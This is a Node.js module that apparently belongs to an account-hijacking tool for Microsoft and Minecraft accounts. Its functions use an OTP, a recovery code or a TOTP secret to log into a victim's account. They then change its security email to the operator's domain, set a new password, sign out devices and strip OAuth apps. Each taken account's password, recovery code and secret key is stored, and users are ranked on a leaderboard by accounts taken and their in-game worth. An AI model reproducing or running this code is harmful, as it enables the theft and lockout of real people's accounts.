const { query, get, run, getConfig } = require('../db');
const path = require('path');
const crypto = require('crypto');

function generateUid(len = 9) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let res = '';
  for (let i = 0; i < len; i++) {
    res += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return res;
}

function getOrCreateUserSecureConfig(userId) {
  let conf = get('SELECT * FROM secureconfig WHERE user_id = ?', [userId]);
  if (!conf) {
    run(
      `INSERT INTO secureconfig (
        user_id, exploit, auto_secure, change_ign, multiplayer, oauthapps, 
        removedevices, changegamertag, signout, autoquarantine, checkban, 
        changeprimary, secureifnomc, addzyger, subscribemail, changedob, 
        changename, changepfp, changelanguage, language, prefix, dob, name, 
        pfp, domain
      ) VALUES (?, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 'en-US', 'old', '2000-01-01', 'Player', 'https://share.creavite.co/695a48d25e75e9c085840eac.png', 'exodev.sbs')`,
      [userId]
    );
    conf = get('SELECT * FROM secureconfig WHERE user_id = ?', [userId]);
  }
  return conf;
}

function updateSecureConfig(userId, newSettings) {
  const current = getOrCreateUserSecureConfig(userId);
  const fields = [
    'exploit', 'auto_secure', 'change_ign', 'multiplayer', 'oauthapps',
    'removedevices', 'changegamertag', 'signout', 'autoquarantine', 'checkban',
    'changeprimary', 'secureifnomc', 'addzyger', 'subscribemail', 'changedob',
    'changename', 'changepfp', 'changelanguage', 'language', 'prefix', 'dob',
    'name', 'pfp', 'domain'
  ];

  const updates = [];
  const values = [];

  for (const field of fields) {
    if (newSettings[field] !== undefined) {
      updates.push(`${field} = ?`);
      values.push(newSettings[field]);
    }
  }

  if (updates.length > 0) {
    values.push(userId);
    run(`UPDATE secureconfig SET ${updates.join(', ')} WHERE user_id = ?`, values);
  }

  return get('SELECT * FROM secureconfig WHERE user_id = ?', [userId]);
}

async function insertAccountRecord(accData, userId) {
  const ownerId = userId !== null && userId !== undefined ? String(userId).trim() : '';
  if (!ownerId) {
    throw new Error('Cannot save account without a valid user_id');
  }

  const currentEpoch = Math.floor(Date.now() / 1000);
  const uid = accData.uid || generateUid();

  let statsStr = 'null';
  let networthVal = 0;

  if (accData.stats) {
    statsStr = typeof accData.stats === 'object' ? JSON.stringify(accData.stats) : String(accData.stats);
    if (accData.stats?.skyblock && Array.isArray(accData.stats.skyblock)) {
      const activeProf = accData.stats.skyblock.find(p => p.current);
      if (activeProf && activeProf.networth) {
        networthVal = parseInt(activeProf.networth, 10) || 0;
      }
    }
  }

  run(
    `INSERT INTO accounts (
      uid, user_id, username, ownsmc, capes, email, recoverycode, secemail, 
      secretkey, password, stats_id, time
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(uid) DO UPDATE SET
      user_id = COALESCE(NULLIF(accounts.user_id, ''), excluded.user_id),
      username = excluded.username,
      ownsmc = excluded.ownsmc,
      capes = excluded.capes,
      email = excluded.email,
      recoverycode = excluded.recoverycode,
      secemail = excluded.secemail,
      secretkey = excluded.secretkey,
      password = excluded.password,
      stats_id = excluded.stats_id,
      time = excluded.time`,
    [
      uid,
      ownerId,
      accData.username || 'Unknown',
      accData.ownsmc || 'Purchased',
      accData.capes || 'None',
      accData.email,
      accData.recoverycode || 'N/A',
      accData.secemail || 'None',
      accData.secretkey || 'Disabled',
      accData.password || '',
      statsStr,
      String(currentEpoch)
    ]
  );

  const existingLink = get('SELECT 1 FROM accountsbyuser WHERE user_id = ? AND uid = ?', [ownerId, uid]);
  if (!existingLink) {
    run(
      `INSERT INTO accountsbyuser (user_id, uid, time, claimed) VALUES (?, ?, ?, 0)`,
      [ownerId, uid, String(currentEpoch)]
    );
  }

  try {
    run(`UPDATE extrainformation SET user_id = ? WHERE uid = ? AND (user_id IS NULL OR user_id = '')`, [ownerId, uid]);
  } catch (e) {}

  // Update leaderboard
  const lb = get('SELECT * FROM leaderboard WHERE user_id = ?', [ownerId]);
  if (lb) {
    run(
      'UPDATE leaderboard SET amount = amount + 1, networth = networth + ? WHERE user_id = ?',
      [networthVal, ownerId]
    );
  } else {
    run(
      'INSERT INTO leaderboard (user_id, networth, amount) VALUES (?, ?, 1)',
      [ownerId, networthVal]
    );
  }

  return { uid, time: currentEpoch };
}

async function secureWithOTP({ userId, email, otp, mcign }) {
  if (!email || !otp) {
    return { success: false, error: 'Email and OTP are required' };
  }

  const settings = getOrCreateUserSecureConfig(userId);

  try {
    const getCredentials = require('../../autosecure/utils/info/getCredentials');
    const login = require('../../autosecure/utils/secure/login');
    const secure = require('../../autosecure/utils/secure/recodesecure');

    const creds = await getCredentials(email, false);
    const proofs = creds?.Credentials?.OtcLoginEligibleProofs || [];

    if (!proofs.length) {
      return { success: false, error: 'Invalid email or OTP disabled for this account.' };
    }

    let host = null;
    for (const sec of proofs) {
      host = await login({ email, id: sec.data, code: otp }, creds);
      if (host) break;
    }

    if (!host) {
      return { success: false, error: 'Invalid OTP code or login failed.' };
    }

    const uid = generateUid();
    const result = await secure(host, settings, uid, mcign);

    const inserted = await insertAccountRecord({
      uid,
      username: result.oldName || result.newName || mcign || 'Secured Account',
      ownsmc: result.mc || 'Purchased',
      capes: Array.isArray(result.capes) ? result.capes.join(', ') : 'None',
      email: result.email || email,
      recoverycode: result.recoveryCode || 'N/A',
      secemail: result.secEmail || 'None',
      secretkey: result.secretkey || 'Disabled',
      password: result.password || 'Generated',
      stats: result.stats || null
    }, userId);

    return {
      success: true,
      uid,
      account: result
    };
  } catch (err) {
    // If live Microsoft auth fails due to environment network or expired OTP, return informative failure
    return {
      success: false,
      error: `Securing operation failed: ${err.message}`
    };
  }
}

async function secureWithRecoveryCode({ userId, email, recoveryCode, mcign }) {
  if (!email || !recoveryCode) {
    return { success: false, error: 'Email and 25-character recovery code are required' };
  }

  const settings = getOrCreateUserSecureConfig(userId);
  const config = getConfig();
  const domain = (config.domains && config.domains[0]) || 'exodev.sbs';

  try {
    const recoveryCodeSecure = require('../../autosecure/utils/secure/recoveryCodeSecure');
    const secEmail = `${crypto.randomBytes(8).toString('hex')}@${domain}`;
    const password = crypto.randomBytes(8).toString('hex');

    const data = await recoveryCodeSecure(email, recoveryCode, secEmail, password);

    if (data === null) return { success: false, error: 'Invalid email address' };
    if (data === 'tfa') return { success: false, error: 'Cannot secure with 2FA enabled' };
    if (data === 'invalid') return { success: false, error: 'Invalid Recovery Code' };
    if (data === 'same') return { success: false, error: 'Duplicate password or secEmail entered' };
    if (data?.error) return { success: false, error: data.error };

    const uid = generateUid();
    await insertAccountRecord({
      uid,
      username: mcign || data.email2 || 'Secured Account',
      ownsmc: 'Pending Check',
      capes: 'None',
      email: data.email2 || email,
      recoverycode: data.recoveryCode || recoveryCode,
      secemail: data.secEmail || secEmail,
      secretkey: 'Disabled',
      password: data.password || password
    }, userId);

    return {
      success: true,
      uid,
      data
    };
  } catch (err) {
    return {
      success: false,
      error: `Recovery securing failed: ${err.message}`
    };
  }
}

async function secureWithZyger({ userId, email, password, secretKey, mcign }) {
  if (!email || !password || !secretKey) {
    return { success: false, error: 'Email, Password, and Secret Key are required' };
  }

  const settings = getOrCreateUserSecureConfig(userId);

  try {
    const generateotp = require('../../autosecure/utils/secure/codefromsecret');
    const login = require('../../autosecure/utils/secure/login');
    const secure = require('../../autosecure/utils/secure/recodesecure');
    const getCredentials = require('../../autosecure/utils/info/getCredentials');

    const totpCode = await generateotp(secretKey);
    const creds = await getCredentials(email, false);
    const proofs = creds?.Credentials?.OtcLoginEligibleProofs || [];

    let host = null;
    for (const sec of proofs) {
      host = await login({ email, id: sec.data, code: totpCode, password }, creds);
      if (host) break;
    }

    const uid = generateUid();
    if (host) {
      const result = await secure(host, settings, uid, mcign);
      await insertAccountRecord({
        uid,
        username: result.oldName || result.newName || mcign || 'Secured Account',
        ownsmc: result.mc || 'Purchased',
        capes: Array.isArray(result.capes) ? result.capes.join(', ') : 'None',
        email: result.email || email,
        recoverycode: result.recoveryCode || 'N/A',
        secemail: result.secEmail || 'None',
        secretkey: secretKey,
        password: result.password || password
      }, userId);

      return { success: true, uid, account: result };
    }

    return { success: false, error: 'Login with secret key / TOTP was unsuccessful.' };
  } catch (err) {
    return { success: false, error: `Zyger securing error: ${err.message}` };
  }
}

module.exports = {
  getOrCreateUserSecureConfig,
  updateSecureConfig,
  insertAccountRecord,
  secureWithOTP,
  secureWithRecoveryCode,
  secureWithZyger,
  generateUid
};
